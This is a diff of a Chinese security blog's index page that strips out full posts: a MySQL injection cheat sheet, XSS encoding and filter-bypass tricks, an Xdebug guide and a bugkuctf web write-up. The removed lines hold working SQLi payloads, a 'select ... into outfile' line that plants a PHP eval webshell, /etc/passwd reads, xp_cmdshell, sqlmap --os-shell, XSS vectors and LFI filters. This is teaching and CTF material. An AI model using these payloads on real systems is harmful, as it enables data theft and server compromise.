@@ -270,144 +270,9 @@
 <li>宽字节注入</li>
 <li>堆叠注入</li>
 </ul>
-<h2 id="0x02-MySQL常用函数"><a href="#0x02-MySQL常用函数" class="headerlink" title="0x02 MySQL常用函数"></a>0x02 MySQL常用函数</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><ul>
-<li><p><code>concat(str1, str2, str3...)</code></p>
-<p>  concat函数连接一个或者多个字符串，若其中一个为null，则返回null.</p>
-</li>
-<li><p><code>concat_ws(separator,str1,str2,…)</code></p>
-<p>  CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符可以是一个字符串，也可以是其它参数。若分隔符为 NULL，则结果为 NULL。函数会忽略任何 str 参数中的 NULL 值。</p>
-</li>
-<li><p><code>group_concat([DISTINCT] 字段名 [Order BY 某字段 ASC/DESC] [Separator &#39;分隔符&#39;])</code></p>
-<p>  将某个字段的值连接起来，默认’,’为分隔符，可与group by一起使用。</p>
-</li>
-</ul>
-<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><ul>
-<li><p><code>mid(column_name, start [,length])</code></p>
-<p>  start起始为1；length若省略则返回剩余文本。mid函数仅MySQL支持。</p>
-</li>
-<li>substring、substr与mid用法相同</li>
-<li><p><code>left(string, n)</code></p>
-<p>  指定左部截取n个字符。right()为右部截取n个字符，参数同left。</p>
-</li>
-</ul>
-<h3 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a><code>ascii()</code></h3><p>返回的字符的ascii码值。ord()相比还适用于多字节字符。</p>
-<h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><p>查找flag开头的字符串：<code>select flag from flag where flag regexp &#39;^flag&#39;</code></p>
-<h2 id="0x03-sql注入方法与技巧"><a href="#0x03-sql注入方法与技巧" class="headerlink" title="0x03 sql注入方法与技巧"></a>0x03 sql注入方法与技巧</h2><p>可用<code>&#39;or 1=1#</code>或<code>&#39;)and 1=2#</code>等来初步测试sqli。</p>
-<h3 id="a-常用查询"><a href="#a-常用查询" class="headerlink" title="a.常用查询"></a>a.常用查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">database</span>();</div><div class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata;</div><div class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ctf20xx'</span>;</div><div class="line"><span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.Columns <span class="keyword">where</span> table_schema=<span class="string">'ctf20xx'</span> <span class="keyword">and</span> table_name=<span class="string">'flag'</span>;</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.user;</div></pre></td></tr></table></figure>
-<h3 id="b-联合查询"><a href="#b-联合查询" class="headerlink" title="b.联合查询"></a>b.联合查询</h3><p>通过闭合语句引号或括号，使用union来查询所需内容。需要相同字段。可用<code>select 1,2,3</code>或<code>order by 3</code>来测试字段数。</p>
-<h3 id="c-布尔盲注"><a href="#c-布尔盲注" class="headerlink" title="c.布尔盲注"></a>c.布尔盲注</h3><ul>
-<li><p>2*1e308大法：<code>-1&#39;and(select(select(flag)from(flag))like binary 0x4625)*2*1e308#</code></p>
-</li>
-<li><p>substr和ascii：<code>ascii(substr((select database()),1,1))=98#</code></p>
-</li>
-<li><p>if盲注：<code>aaa&#39; and if((select flag from flag where flag like binary 0x4625),1,0)#</code></p>
-</li>
-</ul>
-<h3 id="d-时间盲注"><a href="#d-时间盲注" class="headerlink" title="d.时间盲注"></a>d.时间盲注</h3><ul>
-<li><p>sleep(second)：<code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code></p>
-</li>
-<li><p>benchmark(count, expr)：<code>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null) FROM (select database() as current) as tb1;</code></p>
-</li>
-</ul>
-<h3 id="e-报错注入"><a href="#e-报错注入" class="headerlink" title="e.报错注入"></a>e.报错注入</h3><ul>
-<li><p>2*1e308报错：<code>aa&#39;and(select(1E308*if((select*from(select(flag)from(flag)limit 1)x),2,2)))#</code></p>
-</li>
-<li><p>updatexml报错(限制32字符)：<code>-1&#39;and(updatexml(1,concat(0x7e,(select(substr(flag,10))from(flag))),1))#</code></p>
-</li>
-<li><p>extractvalue报错(限制32字符)：<code>-1&#39;)and(extractvalue(1,concat(0x5c,(select(flag)from(flag)))))%23</code></p>
-</li>
-</ul>
-<p><strong>以下技巧高版本未成功：</strong></p>
-<ul>
-<li><p>exp报错：<code>-1&#39;and(exp(~(select*from(select(flag)from(flag))a)))#</code></p>
-</li>
-<li><p>geometrycollection报错：<code>-1&#39;and(geometrycollection((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-</li>
-<li><p>polygon报错：<code>-1&#39;and(polygon((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-</li>
-<li><p>multipolygon报错：<code>-1&#39;and(multipolygon((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-</li>
-<li><p>multipoint报错：<code>-1&#39;and(multipoint((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-</li>
-<li><p>multilinestring报错：<code>-1&#39;and(multilinestring((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-</li>
-<li><p>linestring报错：<code>-1&#39;and linestring((select * from (select * from (select user())a)b))</code></p>
-</li>
-</ul>
-<p><strong>以下技巧高版本中未测试：</strong></p>
-<ul>
-<li><p>bigint超出范围：<code>select !(select * from (select user())x) - ~0</code></p>
-</li>
-<li><p>mysql重复特性：<code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code></p>
-</li>
-<li><p>计数重复报错/bug?：<code>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</code></p>
-</li>
-<li><p>上一条技巧的懵逼形式：<code>select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2))</code></p>
-</li>
-</ul>
-<p><strong>Trick</strong></p>
-<p>通过<code>polygon()</code>和<code>linestring()</code>可爆出当前表名。还有<code>multipoint、multilinestring、multipolygon</code>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">1</span> <span class="keyword">and</span> polygon(proid);</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">1</span> <span class="keyword">and</span> linestring(proid);</div></pre></td></tr></table></figure>
-<p>通过<code>join + using</code>的方法来获取字段名：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">as</span> A <span class="keyword">join</span> <span class="keyword">user</span> <span class="keyword">as</span> B <span class="keyword">using</span>(pro_id)) <span class="keyword">as</span> C;</div></pre></td></tr></table></figure>
-<p>通过联合查询，运用虚拟表在不出现字段名的情况下查出内容：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> proid=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,a<span class="number">.1</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)a;</div></pre></td></tr></table></figure>
-<h3 id="f-导入导出操作"><a href="#f-导入导出操作" class="headerlink" title="f.导入导出操作"></a>f.导入导出操作</h3><ul>
-<li>load_file导出文件：</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>);</div></pre></td></tr></table></figure>
-<ul>
-<li>into outfile写入文件：</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php eval($_GET['key']);"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/evil.php'</span>;</div></pre></td></tr></table></figure>
-<ul>
-<li>into outfile 后可跟<code>lines terminated by 0x...</code>(参考sqlmap os-shell)。以16进制内容结尾，而不是<code>&#39;\r\n&#39;</code>：</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> * <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/evil.php'</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="number">0</span>x.....;</div></pre></td></tr></table></figure>
-<p>into dumpfile写入二进制。into outfile写入文本文件。</p>
-<h3 id="g-宽字节注入"><a href="#g-宽字节注入" class="headerlink" title="g.宽字节注入"></a>g.宽字节注入</h3><p>当MySQL使用宽字节编码时，会产生宽字节注入。若<code>character_set_client=gbk</code>时。输入<code>%aa&#39;</code>对单引号转义后变成<code>%aa%5c%27</code>,其中aa5c被mysql当成一个字符，导致单引号逃逸。可通过<code>Mysql_query(&quot;SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary&quot;,$conn);</code>来防御宽字节注入。</p>
-<blockquote>
-<p>(1) <code>character_set_client</code>:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</p>
-<p>(2) <code>character_set_connection</code>:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</p>
-<p>(3) <code>character_set_results</code>:SQL语句执行结果编码字符集。</p>
-</blockquote>
-<p><code>mysql_real_escape_string</code>和<code>iconv()</code>注入：参考 <a href="http://drops.blbana.cc/2016/12/05/Mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" target="_blank" rel="external">MySQL宽字节注入 by BlBana</a>和<a href="https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/" target="_blank" rel="external">宽字节注入 by lyiang</a>。</p>
-<h3 id="h-堆叠注入"><a href="#h-堆叠注入" class="headerlink" title="h.堆叠注入"></a>h.堆叠注入</h3><p>用分号结束一条语句的执行，构造执行下一条任意语句。有其局限性。当采用<code>mysql_query()</code>执行sql语句时，多条sql语句将会报错，可使用<code>mysqli::multi_query()</code>。</p>
-<p>例：sqlserver 中最为重要的存储过程的执行：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;exec master..xp_cmdshell 'ipconfig'</div></pre></td></tr></table></figure>
-<p><strong>注：oracle不支持多条语句执行</strong></p>
-<h3 id="i-order-by后的注入"><a href="#i-order-by后的注入" class="headerlink" title="i. order by后的注入"></a>i. <code>order by</code>后的注入</h3><p>布尔盲注或延时注入：</p>
-<ul>
-<li><code>?sort=(select ...)</code></li>
-<li><code>?sort=rand(语句)</code>。如<code>rand(true/false)</code>返回值不同，可利用rand盲注。</li>
-</ul>
-<p>报错注入：</p>
-<ul>
-<li><code>?sort=1&#39;and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</code></li>
-<li><code>procedure analyze()</code>来执行报错注入。</li>
-</ul>
-<p>导出文件：</p>
-<ul>
-<li><code>into outfile &#39;路径&#39;</code>参数来导出结果。或使用<code>lines terminated by 0x...</code>来导出网马。</li>
-</ul>
-<h2 id="0x04-sqlmap常用指令与参数"><a href="#0x04-sqlmap常用指令与参数" class="headerlink" title="0x04 sqlmap常用指令与参数"></a>0x04 sqlmap常用指令与参数</h2><ul>
-<li><code>-u</code>：后跟漏洞网站URL</li>
-<li><code>-r</code>：从POST数据包中注入，后跟文件路径</li>
-<li><code>-p</code>：指定测试参数</li>
-<li><code>--dbms</code>：指定数据库系统类型</li>
-<li><code>--technique=TECH</code>：指定使用的注入方式 (default “BEUSTQ”)</li>
-<li><code>--dbs --tables --columns</code>：枚举所有数据库、表、字段名</li>
-<li><code>-D -T -C</code>：指定数据库、表、字段名称</li>
-<li><code>--dump</code>：导出结果</li>
-<li><code>--os-shell</code>：反弹系统shell</li>
-<li><code>--sql-shell</code>：反弹SQL shell</li>
-<li><code>--level=LEVEL</code>：指定注入测试的等级 (2级可检测cookie)(1-5, default 1)</li>
-<li><code>--risk=RISK</code>：风险等级(1-3, default 1)</li>
-<li><code>--users</code>：枚举数据库用户</li>
-<li><code>--passwords</code>：枚举数据库用户密码哈希值</li>
-<li><code>--string,--not-string,--regexp,--code</code>：提供字符串或者一段正则，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则）；在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。也可提供真与假条件返回的HTTP状态码不一样来注入。如，响应200的时候为真，响应401的时候为假，即<code>--code=200</code>。</li>
-</ul>
-
+        
+          <a class="article-more-a" href="/2018/02/06/SQLi/#more">more >></a>
+        
       
 
       
@@ -507,102 +372,9 @@
 </ul>
 </li>
 </ol>
-<h2 id="0x02-HTML和JavaScript自解码"><a href="#0x02-HTML和JavaScript自解码" class="headerlink" title="0x02 HTML和JavaScript自解码"></a>0x02 HTML和JavaScript自解码</h2><ul>
-<li>输出的上下文环境为HTML时，可进行HTML形式的编码<ul>
-<li>进制编码：<code>&amp;#xH;、&amp;#D;</code></li>
-<li>HTML实体编码：<code>&amp;lt;</code>等</li>
-</ul>
-</li>
-<li>输出的上下文环境为JavaScript时，可进行JavaScript编码<ul>
-<li>Unicode形式：<code>\uH</code></li>
-<li>十六进制：<code>\xH</code></li>
-<li>转义：<code>\&#39;、\&quot;</code>等</li>
-</ul>
-</li>
-<li>编码可参考 <a href="https://security.yirendai.com/news/share/26" target="_blank" rel="external">XSS字符编码与浏览器解析原理</a></li>
-</ul>
-<h2 id="0x03-具备HtmlEncode功能的标签"><a href="#0x03-具备HtmlEncode功能的标签" class="headerlink" title="0x03 具备HtmlEncode功能的标签"></a>0x03 具备HtmlEncode功能的标签</h2><ul>
-<li><code>&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;</code>等具有HtmlEncode编码功能</li>
-<li><code>&lt;xmp&gt;</code>没有编码功能</li>
-<li><code>&lt;plaintext&gt;</code>在浏览器中存在差异</li>
-</ul>
-<h2 id="0x04-浏览器URL编码差异造成的XSS"><a href="#0x04-浏览器URL编码差异造成的XSS" class="headerlink" title="0x04 浏览器URL编码差异造成的XSS"></a>0x04 浏览器URL编码差异造成的XSS</h2><ul>
-<li>对’”`&lt;&gt;的编码差异</li>
-<li>对location.hash值的编码差异</li>
-</ul>
-<h2 id="0x05-HTML中的代码注入技巧"><a href="#0x05-HTML中的代码注入技巧" class="headerlink" title="0x05 HTML中的代码注入技巧"></a>0x05 HTML中的代码注入技巧</h2><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><ul>
-<li>标签大小写不敏感</li>
-<li><p>根据浏览器对XHTML的支持插入XML代码、SVG代码或未知标签</p>
-<ul>
-<li><p>如在IE6可构造</p>
-<p>  <code>&lt;XSS STYLE=&quot;xss:expression(alert(&#39;xss&#39;))&quot;&gt;</code></p>
-</li>
-</ul>
-</li>
-<li><p>标签的优先级绕过过滤器</p>
-<ul>
-<li>如<code>&lt;textarea&gt;、&lt;title&gt;、&lt;style&gt;、&lt;script&gt;、&lt;xmp&gt;</code>和注释<code>&lt;!-- --&gt;</code>或<code>&lt;!-- --!&gt;</code>具有高优先级。</li>
-<li><p>对下面的代码，过滤器可能会认为<code>&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;</code>是属性href的值。</p>
-  <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- &lt;a href="--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)//</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
-</li>
-<li><p>如<code>&lt;! foo=&quot;&gt;&lt;script&gt;&lt;/script&gt;&quot;&gt;</code></p>
-</li>
-</ul>
-</li>
-<li>IE HTML 条件控制语句<ul>
-<li>如 <code>&lt;!--[if IE 6]&gt;only IE6..test..&lt;![endif]--&gt;</code></li>
-<li>如 <code>&lt;!--[if &lt;img src=x onerror=alert(2)//]&gt; --&gt;</code></li>
-</ul>
-</li>
-<li><p><code>&lt;svg&gt;</code>标签下的<code>&lt;script&gt;</code>或其他CDATA元素会先进行XML解析,因此，可进行HTML实体编码或进制编码。</p>
-  <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ul>
-<li>属性大小写不敏感</li>
-<li>IE中属性可用反引号包括</li>
-<li>标签与属性、属性名与等号、等号与属性值之间可插入空格、换行符、回车符或Tab等。</li>
-<li><p>在属性值的头部和尾部（引号内）插入控制字符（ASCII值1~32),如:</p>
-  <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> &amp;#<span class="attr">8</span> <span class="attr">href</span>=<span class="string">"&amp;#32javascript:alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
-</li>
-<li><p>黑膜法：<code>&lt;input type=&quot;image&quot;</code></p>
-</li>
-</ul>
-<h2 id="0x06-CSS中代码注入技巧"><a href="#0x06-CSS中代码注入技巧" class="headerlink" title="0x06 CSS中代码注入技巧"></a>0x06 CSS中代码注入技巧</h2><ul>
-<li>大小写不敏感</li>
-<li>属性值对单双引号不敏感</li>
-<li>资源类属性的URL部分对单双引号或无引号不敏感</li>
-<li>空格可用tab、回车和换行符替代被浏览器解析</li>
-<li><p>资源类属性中通过伪协议完成XSS利用,如：</p>
-  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">'jAvasCRipT:alert(1)'</span>);&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>behavior引入一段含JS的代码片段，不能跨域。(IE)</p>
-</li>
-<li><p>@import引入一段CSS代码</p>
-<ul>
-<li><p>可在任意地方插入<code>&#39;\&#39;</code>以及<code>&#39;\&#39;+0</code>的组合（IE7及以下），如：</p>
-  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@\<span class="keyword">iMp</span>\<span class="keyword">00or</span>\<span class="keyword">0T</span> <span class="string">"url"</span>;</div></pre></td></tr></table></figure>
-</li>
-<li><p>IE8开始<code>&#39;\&#39;+0</code>不可用，<code>&#39;\&#39;</code>仍然可用。</p>
-</li>
-</ul>
-</li>
-<li><p>expression(IE7及以下版本)</p>
-<ul>
-<li><p>用注释混淆：</p>
-  <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">body&#123;xs/*zzz*/s:ex/**/press/**/ion((window.x==1)?'':eval('x=1;alert(2);'));&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>在IE6下，可用全角字符混淆：</p>
-  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span>&#123;<span class="attribute">xss</span>:exｐｒｅｓｓ<span class="built_in">ion</span>((window.x==1)?<span class="string">''</span>:<span class="built_in">eval</span>(<span class="string">'x=1;alert(2);'</span>));&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>16进制编码：<br>  <code>body{\078\073\073:\065\078\070\072\065\073\073\069\06f\06e((window.x==1)?&#39;&#39;:eval(&#39;x=1;alert(2);&#39;));}</code></p>
-</li>
-<li><p>utf-7编码：</p>
-  <figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">charset</span> <span class="string">"utf-7"</span>;</div><div class="line"><span class="selector-tag">body</span>&#123;</div><div class="line"> <span class="attribute">aaa</span>:e+AHgAcABy-e+AHMAcw-i+AG8-n+ACg-if+ACgAdw-ind+AG8AdwAuAHgAIQA9ADEAKQB7AGEAbA-e+AHIAdAAoADEAKQA7AHc-ind+AG8AdwAuAHgAPQAxADsAfQApADs-</div><div class="line">&#125;</div></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-
+        
+          <a class="article-more-a" href="/2018/01/04/xss/#more">more >></a>
+        
       
 
       
@@ -673,20 +445,9 @@
 <h2 id="首先你得有phpstudy"><a href="#首先你得有phpstudy" class="headerlink" title="首先你得有phpstudy"></a>首先你得有phpstudy</h2><p><a href="http://www.phpstudy.net/" target="_blank" rel="external">下载phpstudy</a>，phpstudy里自带了Xdebug的扩展，可以在其他选项菜单-&gt;PHP扩展及设置-&gt;PHP扩展里把”Xdebug”√上。然后你开始用<code>phpinfo();</code>测试一下，如果出现了Xdebug，那就成功了第一步了。</p>
 <p><img src="/2017/10/03/Xdebug/0.png" alt=""></p>
 <h2 id="在sublime中安装Xdebug-Client"><a href="#在sublime中安装Xdebug-Client" class="headerlink" title="在sublime中安装Xdebug Client"></a>在sublime中安装Xdebug Client</h2><p>看了网上的一些教程，看到某位sublime2使用者安装的是Xdebug而不是Xdebug Client，而我在sublime3的Install Package中只看到了Xdebug Client，于是就安装了（BTW：据说两者都安装会有冲突）。使用<code>Ctrl+Alt+P</code>键入Install Package,搜索Xdebug并安装。</p>
-<h2 id="在chrome中下载Xdebug-helper"><a href="#在chrome中下载Xdebug-helper" class="headerlink" title="在chrome中下载Xdebug helper"></a>在chrome中下载Xdebug helper</h2><p>下载地址：<a href="https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc" target="_blank" rel="external">Chrome应用商店Xdebug helper</a></p>
-<p>在IDE Key中选择<code>other</code>，然后输入<code>sublime.xdebug</code>,最后save。</p>
-<p><img src="/2017/10/03/Xdebug/1.png" alt=""></p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol>
-<li>在chrome中打开要调试的地址，如<code>localhost/test.php</code>，然后启用Xdebug helper，会变绿 :)</li>
-<li>在sublime里下断点，断点的快捷键为<code>Ctrl+F8</code>,其他的快捷键可以在Installed Packages\Xdebug Client.sublime-package中的Default.sublime-keymap查看。</li>
-<li><code>Ctrl+Shift+F9</code>开启调试，在chrome中F5刷新。</li>
-<li>在sublime中可看到变量信息等等。<code>Ctrl+Shift+f5</code>运行到下一个断点;<code>Ctrl+Shift+f6</code>单步;<code>alt+shift+1</code>退出debug。</li>
-</ol>
-<hr>
-<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://quericy.me/blog/196/" target="_blank" rel="external">使用sublime2配合phpstudy+xdebug+chrome调试php</a></p>
-<p><a href="http://www.jianshu.com/p/7ad1e59baed2" target="_blank" rel="external">Windows 下 Sublime Text 3 使用 Xdebug （配合Xdebug helper 插件）</a></p>
-<p><a href="http://www.cnblogs.com/pthlp/p/5522869.html" target="_blank" rel="external">sublime 修改Xdebug插件快捷键</a></p>
-
+        
+          <a class="article-more-a" href="/2017/10/03/Xdebug/#more">more >></a>
+        
       
 
       
@@ -754,72 +515,9 @@
 <h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>这题对Content-Type和filename做了检查。上传一个jpg文件，burpsuite抓包将文件扩展改为php即可拿到flag。</p>
 <h2 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h2><p>在Resource中找到code.js文件，发现flag。</p>
 <p><img src="/2017/09/30/bugkuctf-web-writeup/0.png" alt=""></p>
-<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>禁止弹窗后F12或在url开头加<code>view-source:</code>查看源代码，在结尾可发现一段HTML10进制的编码，解码后得到flag。</p>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>得知网页为gbk编码，采用宽字符注入。payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?id=1%aa%27union%20select%201,string%20from%20`key`%20where%20id=1%20%23</div></pre></td></tr></table></figure>
-<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>XSS过滤中过滤掉了尖括号，因此可用尖括号来绕过sql过滤。<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?id=1%20u&lt;&gt;nion%20s&lt;&gt;elect%201,hash%20f&lt;&gt;rom%20`key`%20where%20id=1%23</div></pre></td></tr></table></figure>
-<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>查看源代码，多刷新几次可找到flag</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/1.png" alt=""></p>
-<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?hello=1);show_source(%27flag.php%27</div></pre></td></tr></table></figure>
-<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>通过超全局变量GLOBALS，即可拿到flag。</p>
-<h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>查看源码，得到eval()函数里的代码为</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</div><div class="line">    <span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</div><div class="line">            <span class="keyword">return</span>!<span class="number">0</span>;</div><div class="line">        alert(<span class="string">"Error"</span>);</div><div class="line">        a.focus();</div><div class="line">        <span class="keyword">return</span>!<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</div></pre></td></tr></table></figure>
-<p>输入<code>67d709b2b54aa2aa648cf6e87a7114f1</code>即可拿到flag。</p>
-<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>jsfuck编码，直接丢console回车即可拿到flag。</p>
-<h2 id="flag在index中"><a href="#flag在index中" class="headerlink" title="flag在index中"></a>flag在index中</h2><p>利用php://filter协议可得flag。payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
